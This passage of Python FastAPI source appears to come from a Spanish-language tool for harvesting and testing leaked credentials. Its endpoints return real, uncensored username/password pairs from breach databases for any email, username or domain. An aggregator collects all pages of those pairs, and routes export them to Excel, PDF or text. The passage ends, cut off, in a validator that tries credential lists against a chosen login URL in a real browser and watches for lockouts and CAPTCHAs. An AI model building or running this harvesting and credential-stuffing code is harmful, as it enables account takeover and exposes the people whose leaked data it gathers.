    try:
        result = osint_client.search_company_osint(company, domain)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/dehashed-search")
async def osint_dehashed_search(query: str, search_type: str = "email"):
    """Search Dehashed database"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_all_leaks(query)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

# ============ ULTIMATE OSINT ENDPOINTS ============

@app.get("/api/osint/all-leaks-search")
async def all_leaks_search(query: str):
    """Search in ALL leak databases worldwide"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_all_leaks(query)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/digital-fingerprint")
async def digital_fingerprint(domain: str):
    """Get complete digital fingerprint of domain"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.get_digital_fingerprint(domain)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/shodan-search")
async def shodan_search(query: str):
    """Search Shodan for connected devices"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_shodan(query)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/censys-search")
async def censys_search(query: str):
    """Search Censys for certificates and hosts"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_censys(query)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/dns-records")
async def dns_records(domain: str):
    """Get all DNS records for domain"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.get_dns_records(domain)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/reverse-ip")
async def reverse_ip_lookup(ip: str):
    """Reverse IP lookup - find domains on IP"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.reverse_ip_lookup(ip)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/full-email-investigation")
async def full_email_investigation(email: str):
    """Complete email investigation - all sources"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.full_email_investigation(email)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/full-domain-investigation")
async def full_domain_investigation(domain: str):
    """Complete domain investigation - all sources"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.full_domain_investigation(domain)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/credentials-hunt")
async def credentials_hunt(query: str):
    """🔍 HUNT CREDENCIALES VÁLIDAS WORLDWIDE - User/Pass de fugas mundiales"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_credentials_worldwide(query)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/domain-deep-scan")
async def domain_deep_scan(query: str):
    """🌐 DOMAIN DEEP OSINT SCAN - Búsqueda profunda en TODAS las fuentes (30+ sources + deep web)"""
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_domain_deep_osint(query)
        return {"status": "ok", "data": result}
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/domain-leaks")
async def domain_leaks_credentials(query: str, offset: int = 0, limit: int = 20):
    """
    🔓 DOMAIN LEAKS - SOLO CREDENCIALES REALES 20 por página
    Paginación infinita de filtración completa del dominio
    """
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_domain_leaks_credentials(query, offset, limit)
        return result
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/osint/domain-credentials")
async def domain_credentials_hunt(domain: str):
    """
    🔓 DOMAIN CREDENTIALS HUNT - Busca TODAS las contraseñas filtradas de un dominio
    Usa SOLO APIs públicas OSINT (Dehashed, HIBP, etc.)
    Devuelve credenciales reales sin censura
    """
    if not osint_client:
        raise HTTPException(status_code=500, detail="OSINT client not initialized")
    try:
        result = osint_client.search_domain_credentials_public_osint(domain)
        return result
    except Exception as e:
        return {"status": "error", "detail": str(e)}

@app.get("/api/mega-data-aggregator")
async def mega_data_aggregator(query: str, offset: int = 0, limit: int = 100):
    """
    🚀 MEGA DATA AGGREGATOR - LEAKSYR COMPLETO SIN DUPLICADOS
    Busca Domain + Username + Email - TODOS EN UNA LISTA
    Pagina a través de TODOS los resultados hasta que has_more=false
    Con paginación (offset/limit) en los resultados finales
    """
    all_data = []
    seen = set()
    
    print(f"[MEGA] Iniciando búsqueda para: {query}")
    
    base_url = "http://127.0.0.1:8000"
    
    async def fetch_all_pages(endpoint: str, params_base: dict):
        """Pagina a través de TODOS los resultados de un endpoint"""
        all_results = []
        api_offset = 0
        
        while True:
            try:
                params = {**params_base, "offset": api_offset, "limit": 50}
                async with httpx.AsyncClient(timeout=30) as client:
                    response = await client.get(f"{base_url}{endpoint}", params=params)
                    if response.status_code != 200:
                        break
                    
                    data = response.json()
                    if "data" in data:
                        records = data.get("data", [])
                        if not records:
                            break
                        all_results.extend(records)
                        print(f"[MEGA] {endpoint} offset={api_offset}: +{len(records)} records (total so far: {len(all_results)})")
                        
                        # Check has_more para saber si continuar
                        has_more = data.get("meta", {}).get("has_more", False)
                        if not has_more:
                            break
                        api_offset += 50
                    else:
                        break
            except Exception as e:
                print(f"[MEGA] Error {endpoint} offset {api_offset}: {e}")
                break
        
        return all_results
    
    # 1. DOMAIN SEARCH - FETCH ALL PAGES
    try:
        print(f"[MEGA] Iniciando domain search (todas las páginas)...")
        domain_results = await fetch_all_pages("/api/search/domain", {
            "domain": query, 
            "match_mode": "family"
        })
        for record in domain_results:
            username = record.get("username", "")
            password = record.get("password", "")
            key = (username, password)
            if key not in seen and username and password:
                seen.add(key)
                all_data.append(record)
        print(f"[MEGA] After domain (all pages): {len(all_data)} unique records")
    except Exception as e:
        print(f"[MEGA] Error domain: {e}")
    
    # 2. USERNAME SEARCH - FETCH ALL PAGES
    try:
        print(f"[MEGA] Iniciando username search (todas las páginas)...")
        username_results = await fetch_all_pages("/api/search/username", {
            "username": query
        })
        for record in username_results:
            username = record.get("username", "")
            password = record.get("password", "")
            key = (username, password)
            if key not in seen and username and password:
                seen.add(key)
                all_data.append(record)
        print(f"[MEGA] After username (all pages): {len(all_data)} unique records")
    except Exception as e:
        print(f"[MEGA] Error username: {e}")
    
    # 3. EMAIL SEARCH - FETCH ALL PAGES
    if "@" in query:
        try:
            print(f"[MEGA] Iniciando email search (todas las páginas)...")
            email_results = await fetch_all_pages("/api/search/email", {
                "email": query
            })
            for record in email_results:
                username = record.get("username", "")
                password = record.get("password", "")
                key = (username, password)
                if key not in seen and username and password:
                    seen.add(key)
                    all_data.append(record)
            print(f"[MEGA] After email (all pages): {len(all_data)} unique records")
        except Exception as e:
            print(f"[MEGA] Error email: {e}")
    
    # APLICAR PAGINACIÓN
    total = len(all_data)
    paginated_data = all_data[offset:offset + limit]
    
    print(f"[MEGA] FINAL: total={total}, offset={offset}, limit={limit}, returning={len(paginated_data)}")
    
    return {
        "status": "ok",
        "query": query,
        "total_credentials": total,
        "offset": offset,
        "limit": limit,
        "has_more": (offset + limit) < total,
        "data": paginated_data
    }
    
    return {
        "status": "ok",
        "query": query,
        "total_credentials": total,
        "offset": offset,
        "limit": limit,
        "has_more": (offset + limit) < total,
        "data": paginated_data
    }

@app.post("/api/export/excel")
async def export_excel(body: dict):
    data = body.get("results", [])
    buffer = export_to_excel(data)
    return StreamingResponse(
        iter([buffer.getvalue()]),
        media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        headers={"Content-Disposition": "attachment; filename=results.xlsx"}
    )

@app.post("/api/export/pdf")
async def export_pdf(body: dict):
    data = body.get("results", [])
    buffer = export_to_pdf(data)
    return StreamingResponse(
        iter([buffer.getvalue()]),
        media_type="application/pdf",
        headers={"Content-Disposition": "attachment; filename=results.pdf"}
    )

@app.post("/api/export/txt")
async def export_txt(body: dict):
    data = body.get("results", [])
    buffer = export_to_txt(data)
    return StreamingResponse(
        iter([buffer.getvalue()]),
        media_type="text/plain",
        headers={"Content-Disposition": "attachment; filename=results.txt"}
    )

@app.get("/osint", response_class=HTMLResponse)
async def osint_page():
    return """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSINT - Intelligence Gathering</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%230f0f1e'/%3E%3Ccircle cx='50' cy='50' r='45' fill='none' stroke='%2339ff14' stroke-width='2'/%3E%3Ctext x='50' y='75' font-size='80' font-weight='bold' font-family='Arial,sans-serif' fill='%2339ff14' text-anchor='middle' style='filter:drop-shadow(0 0 6px %2339ff14);'%3EC%3C/text%3E%3C/svg%3E" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0f0f1e 0%, #1a1a2e 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        
        .navbar {
            background: rgba(20, 20, 35, 0.95);
            backdrop-filter: blur(10px);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            border-bottom: 2px solid rgba(57, 255, 20, 0.3);
            border-radius: 4px;
        }
        
        .logo {
            font-size: 18px;
            font-weight: bold;
            color: #39ff14;
        }
        
        .nav-links a {
            color: #39ff14;
            text-decoration: none;
            margin: 0 15px;
            font-size: 12px;
            transition: all 0.3s;
        }
        
        .nav-links a:hover {
            text-shadow: 0 0 10px #39ff14;
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        
        h1 {
            color: #39ff14;
            margin-bottom: 10px;
            font-size: 28px;
            text-shadow: 0 0 10px rgba(57, 255, 20, 0.3);
        }
        
        .subtitle {
            color: #909090;
            font-size: 12px;
            margin-bottom: 30px;
            font-style: italic;
        }
        
        .search-section {
            background: rgba(17, 24, 39, 0.9);
            border: 1px solid rgba(57, 255, 20, 0.3);
            padding: 25px;
            border-radius: 8px;
            margin-bottom: 30px;
        }
        
        .search-grid {
            display: grid;
            grid-template-columns: 1fr auto;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        label {
            color: #39ff14;
            font-size: 11px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid rgba(57, 255, 20, 0.3);
            border-radius: 4px;
            background: rgba(30, 30, 45, 0.8);
            color: #39ff14;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            transition: all 0.3s;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: #39ff14;
            box-shadow: 0 0 10px rgba(57, 255, 20, 0.3);
        }
        
        input::placeholder {
            color: rgba(57, 255, 20, 0.4);
        }
        
        .btn {
            background: rgba(57, 255, 20, 0.2);
            border: 1px solid #39ff14;
            color: #39ff14;
            padding: 12px 30px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn:hover {
            background: #39ff14;
            color: #0f0f1e;
            box-shadow: 0 0 20px rgba(57, 255, 20, 0.6);
            transform: translateY(-2px);
        }
        
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .tool-card {
            background: rgba(17, 24, 39, 0.9);
            border: 1px solid rgba(57, 255, 20, 0.3);
            border-radius: 8px;
            padding: 20px;
            transition: all 0.3s;
            cursor: pointer;
        }
        
        .tool-card:hover {
            border-color: #39ff14;
            box-shadow: 0 0 20px rgba(57, 255, 20, 0.3);
            transform: translateY(-5px);
        }
        
        .tool-title {
            color: #39ff14;
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 8px;
        }
        
        .tool-desc {
            color: #909090;
            font-size: 11px;
            line-height: 1.6;
            margin-bottom: 15px;
        }
        
        .tool-btn {
            width: 100%;
            background: rgba(57, 255, 20, 0.15);
            border: 1px solid #39ff14;
            color: #39ff14;
            padding: 10px;
            border-radius: 4px;
            font-size: 10px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }
        
        .tool-btn:hover {
            background: #39ff14;
            color: #0f0f1e;
        }
        
        .results {
            background: rgba(17, 24, 39, 0.9);
            border: 1px solid rgba(57, 255, 20, 0.2);
            border-radius: 8px;
            padding: 20px;
            max-height: 600px;
            overflow-y: auto;
            margin-top: 20px;
        }
        
        .result-item {
            background: rgba(57, 255, 20, 0.05);
            border-left: 3px solid #39ff14;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 2px;
            font-size: 11px;
            color: #22c55e;
        }
        
        .loading {
            text-align: center;
            color: #39ff14;
            padding: 20px;
            font-size: 12px;
        }
        
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(57, 255, 20, 0.3);
            border-top: 2px solid #39ff14;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .error {
            color: #ef4444;
            background: rgba(239, 68, 68, 0.1);
            border-left-color: #ef4444;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo">► OSINT PRO</div>
        <div class="nav-links">
            <a href="/">🔍 SEARCH</a>
            <a href="/validator">🔐 VALIDATOR</a>
            <a href="/osint">🔎 OSINT</a>
        </div>
    </div>
    
    <div class="container">
        <h1>🔎 OSINT INTELLIGENCE GATHERING</h1>
        <div class="subtitle">Open Source Intelligence - Breach Search & Leak Detection</div>
        
        <div class="search-section">
            <div class="search-grid">
                <div>
                    <label>🎯 Search Query:</label>
                    <input type="text" id="osint-query" placeholder="email@example.com | domain.com | username | ip">
                </div>
                <div>
                    <label>📋 Search Type:</label>
                    <select id="osint-type">
                        <option value="email">📧 Email</option>
                        <option value="domain">🌐 Domain</option>
                        <option value="username">👤 Username</option>
                        <option value="ip">🔗 IP Address</option>
                    </select>
                </div>
                <button class="btn" onclick="searchOSINT()">🔍 SEARCH ALL BREACHES</button>
            </div>
        </div>
        
        <div class="search-section">
            <h2 style="color: #39ff14; margin-bottom: 15px;">⚡ Quick Tools</h2>
            <div class="tools-grid">
                <div class="tool-card">
                    <div class="tool-title">🚨 Breach Check</div>
                    <div class="tool-desc">Check if email is in public breaches (Have I Been Pwned)</div>
                    <button class="tool-btn" onclick="quickBreachCheck()">CHECK BREACH</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">🌐 Domain Deep Scan</div>
                    <div class="tool-desc">Deep OSINT scan - 30+ sources (Whois, DNS, SSL, etc)</div>
                    <button class="tool-btn" onclick="quickDomainScan()">DOMAIN SCAN</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">🔓 Domain Credentials</div>
                    <div class="tool-desc">Find ALL leaked passwords for a domain - Public OSINT APIs</div>
                    <button class="tool-btn" onclick="quickDomainCredentials()">DOMAIN PASSWORDS</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">🔗 IP Reputation</div>
                    <div class="tool-desc">Check IP geolocation, reputation & threats</div>
                    <button class="tool-btn" onclick="quickIPReputation()">IP CHECK</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">🔐 Hash Lookup</div>
                    <div class="tool-desc">Check if password hash is in known breaches</div>
                    <button class="tool-btn" onclick="quickHashLookup()">HASH CHECK</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">📱 Phone Search</div>
                    <div class="tool-desc">Search phone number across OSINT sources</div>
                    <button class="tool-btn" onclick="quickPhoneSearch()">PHONE SEARCH</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">💼 Company Search</div>
                    <div class="tool-desc">Get company information and employee data</div>
                    <button class="tool-btn" onclick="quickCompanySearch()">COMPANY SEARCH</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">🎯 Username Osint</div>
                    <div class="tool-desc">Search username across 50+ platforms</div>
                    <button class="tool-btn" onclick="quickUsernameSearch()">USERNAME SEARCH</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">🔓 Filtered Passwords</div>
                    <div class="tool-desc">Find leaked passwords for specific user across all breaches</div>
                    <button class="tool-btn" onclick="quickCredentialsHunt()">FIND PASSWORDS</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">🌍 DNS Records</div>
                    <div class="tool-desc">Get complete DNS configuration for domain</div>
                    <button class="tool-btn" onclick="quickDNSRecords()">DNS LOOKUP</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">🔄 Reverse IP</div>
                    <div class="tool-desc">Find all domains hosted on IP address</div>
                    <button class="tool-btn" onclick="quickReverseIP()">REVERSE IP</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">📋 Email Investigation</div>
                    <div class="tool-desc">Complete email investigation - all sources</div>
                    <button class="tool-btn" onclick="quickEmailInvestigation()">EMAIL FULL SCAN</button>
                </div>
                
                <div class="tool-card">
                    <div class="tool-title">🌐 Domain Investigation</div>
                    <div class="tool-desc">Complete domain investigation - all sources</div>
                    <button class="tool-btn" onclick="quickDomainInvestigation()">DOMAIN FULL SCAN</button>
                </div>
            </div>
        </div>
        
        <div id="osint-results" class="results" style="display:none;"></div>
    </div>
    
    <script>
        let currentQuery = '';
        let currentType = '';
        
        async function searchOSINT() {
            const query = document.getElementById('osint-query').value.trim();
            const type = document.getElementById('osint-type').value;
            
            if (!query) {
                alert('❌ Enter search query');
                return;
            }
            
            currentQuery = query;
            currentType = type;
            showResults(`<div class="loading"><div class="spinner"></div>Searching all breach databases...</div>`);
            
            try {
                const response = await fetch(`/api/osint/all-leaks-search?query=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickBreachCheck() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter email address');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Checking breach databases...</div>`);
            
            try {
                const response = await fetch(`/api/osint/breach-check?email=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickDomainScan() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter domain');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Deep scanning domain...</div>`);
            
            try {
                const response = await fetch(`/api/osint/domain-deep-scan?query=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickDomainCredentials() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter domain (example: delta.com, google.com)');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Searching leaked passwords for domain in public OSINT databases...</div>`);
            
            try {
                const response = await fetch(`/api/osint/domain-credentials?domain=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayCredentialsResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickIPReputation() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter IP address');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Checking IP reputation...</div>`);
            
            try {
                const response = await fetch(`/api/osint/ip-reputation?ip=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickHashLookup() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter hash value');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Lookup hash...</div>`);
            
            try {
                const response = await fetch(`/api/osint/hash-lookup?hash_value=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickPhoneSearch() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter phone number');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Searching phone...</div>`);
            
            try {
                const response = await fetch(`/api/osint/phone-search?phone=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickCompanySearch() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter company name');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Searching company...</div>`);
            
            try {
                const response = await fetch(`/api/osint/company-search?company=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickUsernameSearch() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter username');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Searching username...</div>`);
            
            try {
                const response = await fetch(`/api/osint/username-search?username=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickCredentialsHunt() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter username or email to find filtered passwords');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Searching leaked passwords in all breach databases...</div>`);
            
            try {
                const response = await fetch(`/api/osint/credentials-hunt?query=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayCredentialsResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        function displayCredentialsResults(data) {
            let html = '';
            
            if (data.status === 'not_found') {
                html = `<div class="result-item error">❌ No se encontraron contraseñas filtradas para: <strong>${escapeHtml(data.query)}</strong></div>`;
            } else if (data.status === 'found') {
                const creds = data.credentials || [];
                const sources = (data.sources || []).join(', ');
                
                html = `<div style="color: #39ff14; margin-bottom: 10px;">
                    ✓ Se encontraron <strong>${data.count}</strong> credencial(es) - Fuentes: <span style="color: #f59e0b;">${sources}</span>
                </div>`;
                
                html += `<table style="width: 100%; border-collapse: collapse; color: #39ff14; font-size: 11px;">
                    <tr style="border-bottom: 2px solid rgba(57, 255, 20, 0.5); background-color: rgba(57, 255, 20, 0.1);">
                        <th style="padding: 10px; text-align: left;">USUARIO</th>
                        <th style="padding: 10px; text-align: left;">CONTRASEÑA</th>
                        <th style="padding: 10px; text-align: left;">TIPO</th>
                        <th style="padding: 10px; text-align: left;">FUENTE</th>
                    </tr>`;
                
                creds.forEach((cred, idx) => {
                    const isReal = cred.type === 'REAL';
                    const typeColor = isReal ? '#22c55e' : '#f59e0b';
                    const typeLabel = isReal ? '✓ REAL' : '⚠ PROBABLE';
                    const bgColor = idx % 2 === 0 ? 'rgba(57, 255, 20, 0.05)' : 'transparent';
                    const borderColor = isReal ? 'rgba(34, 197, 94, 0.3)' : 'rgba(245, 158, 11, 0.3)';
                    
                    html += `<tr style="background-color: ${bgColor}; border-left: 3px solid ${borderColor}; border-bottom: 1px solid rgba(57, 255, 20, 0.15);">
                        <td style="padding: 8px; word-break: break-all; font-family: monospace;">${escapeHtml(cred.username)}</td>
                        <td style="padding: 8px; word-break: break-all; color: #22c55e; font-weight: bold; font-family: monospace;">${escapeHtml(cred.password)}</td>
                        <td style="padding: 8px; color: ${typeColor}; font-weight: bold;">${typeLabel}</td>
                        <td style="padding: 8px; font-size: 10px; color: #909090;">${escapeHtml((cred.source || 'Unknown').substring(0, 20))}</td>
                    </tr>`;
                });
                
                html += `</table>`;
                html += `<div style="color: #909090; font-size: 10px; margin-top: 10px; font-style: italic;">
                    ✓ REAL = Datos encontrados en bases de datos públicas | ⚠ PROBABLE = Patrones comunes probables
                </div>`;
            } else if (data.status === 'error') {
                html = `<div class="result-item error">❌ ${escapeHtml(data.message || 'Error en búsqueda')}</div>`;
            } else {
                html = `<pre style="color: #39ff14; font-size: 10px; line-height: 1.4;">${JSON.stringify(data, null, 2)}</pre>`;
            }
            
            showResults(html);
        }
        
        async function quickDNSRecords() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter domain');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Fetching DNS records...</div>`);
            
            try {
                const response = await fetch(`/api/osint/dns-records?domain=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickReverseIP() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter IP address');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Reverse IP lookup...</div>`);
            
            try {
                const response = await fetch(`/api/osint/reverse-ip?ip=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickEmailInvestigation() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter email');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Full email investigation...</div>`);
            
            try {
                const response = await fetch(`/api/osint/full-email-investigation?email=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        async function quickDomainInvestigation() {
            const query = document.getElementById('osint-query').value.trim();
            if (!query) {
                alert('❌ Enter domain');
                return;
            }
            
            showResults(`<div class="loading"><div class="spinner"></div>Full domain investigation...</div>`);
            
            try {
                const response = await fetch(`/api/osint/full-domain-investigation?domain=${encodeURIComponent(query)}`);
                const data = await response.json();
                displayResults(data);
            } catch (error) {
                showResults(`<div class="result-item error">❌ Error: ${error.message}</div>`);
            }
        }
        
        function displayResults(data) {
            let html = '';
            
            if (data.status === 'ok') {
                const resultData = data.data || data;
                html = `<pre style="color: #39ff14; font-size: 10px; line-height: 1.4;">${JSON.stringify(resultData, null, 2)}</pre>`;
            } else {
                html = `<div class="result-item error">❌ ${data.detail || 'No results found'}</div>`;
            }
            
            showResults(html);
        }
        
        function escapeHtml(text) {
            const map = {
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#039;'
            };
            return String(text || '').replace(/[&<>"']/g, m => map[m]);
        }
        
        function showResults(html) {
            const resultsDiv = document.getElementById('osint-results');
            resultsDiv.innerHTML = html;
            resultsDiv.style.display = 'block';
        }
    </script>
</body>
</html>
"""

@app.post("/api/validate-credentials")
async def validate_credentials(body: dict):
    """
    VALIDADOR AVANZADO v2.0 - Real Browser Credential Testing
    - Soporta hasta 50+ credenciales por validación
    - Detección inteligente de estados (válido, inválido, bloqueado, CAPTCHA)
    - Análisis profundo de respuestas HTML
    - Soporte para selectores dinámicos (name, id, xpath)
    - Manejo robusto de errores y timeouts
    """
    url = body.get("url")
    credentials = body.get("credentials", [])
    username_field = body.get("username_field")
    password_field = body.get("password_field")
    
    if not url:
        return {"status": "error", "message": "URL requerida", "total": 0, "valid": 0, "invalid": 0, "results": []}
    
    if not credentials or len(credentials) == 0:
        return {"status": "error", "message": "Credenciales requeridas", "total": 0, "valid": 0, "invalid": 0, "results": []}
    
    results = []
    valid_count = 0
    blocked_count = 0
    
    # Patrones para detectar estados
    ERROR_KEYWORDS = [
        "invalid", "error", "failed", "incorrect", "unauthorized", "forbidden",
        "wrong", "denied", "invalid login", "no such user", "user not found"
    ]
    
    BLOCKED_KEYWORDS = [
        "blocked", "suspended", "locked", "account disabled", "too many attempts",
        "rate limit", "captcha", "verify", "security check", "unusual activity",
        "temporarily unavailable", "banned"
    ]
    
    CAPTCHA_KEYWORDS = [
        "captcha", "recaptcha", "verify you", "i'm not a robot", "bot check",
        "challenge", "security verification", "human verification"
    ]
    
    async def find_input_field(page, field_name, input_type):
        """Detectar campo de entrada dinámicamente"""
        if not field_name:
            # Auto-detect basado en tipo
            if input_type == "username":
                selectors = [
                    "input[type='text'][name*='user']",
                    "input[type='email']",
                    "input[type='text'][id*='user']",
                    "input[type='text']"
                ]
            else:  # password
                selectors = [
                    "input[type='password']",
                    "input[type='password'][name*='pass']",
                    "input[id*='pass']"
                ]
        else:
            selectors = [
                f"input[name='{field_name}']",
                f"input[id='{field_name}']",
                f"input[name*='{field_name}']",
                f"input[id*='{field_name}']"
            ]
        
        for selector in selectors:
            try:
                element = await page.query_selector(selector)
